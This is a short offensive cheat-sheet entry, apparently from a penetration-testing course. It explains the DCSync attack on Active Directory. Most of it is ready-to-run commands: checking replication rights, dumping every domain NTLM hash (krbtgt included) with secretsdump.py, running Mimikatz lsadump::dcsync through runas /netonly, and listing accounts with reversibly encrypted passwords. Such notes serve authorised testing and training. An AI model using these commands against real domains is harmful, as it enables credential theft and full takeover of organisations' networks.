# 01.08 DCSync

> Abuse DS-Replication-Get-Changes-All to impersonate a DC and pull every NTLM hash via `secretsdump.py` or `lsadump::dcsync`.

## Overview

With DS-Replication-Get-Changes-All rights, impersonate a DC to pull NT hashes for any account including krbtgt. secretsdump.py from Linux; Mimikatz lsadump::dcsync from Windows (run as the privileged user via runas /netonly). Use -just-dc-ntlm, -pwd-last-set, -history flags for targeted output.

## Steps

- Verify target user has replication rights with Get-ObjectAcl.
- Linux: secretsdump.py -just-dc dumps all hashes; -just-dc-user for specific account.
- Windows: runas /netonly /user: to spawn shell as privileged user, then mimikatz.
- lsadump::dcsync /user targets specific account; /domain for cross-domain.
- Check for reversible-encryption accounts: Get-DomainUser with ENCRYPTED_TEXT_PWD_ALLOWED filter.

## Commands

### Verify replication rights

```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"; Get-ObjectAcl "DC=<DOMAIN>,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### secretsdump all hashes

```bash
secretsdump.py -outputfile <DOMAIN> -just-dc <DOMAIN>/[email protected]
```

### secretsdump specific user

```bash
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.<DOMAIN>.LOCAL
```

### runas for Mimikatz

```cmd
runas /netonly /user:<DOMAIN>\adunn powershell
```

### Mimikatz DCSync

```text
mimikatz # lsadump::dcsync /domain:<DOMAIN>.LOCAL /user:<DOMAIN>\administrator
```

### Reversible encryption check

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
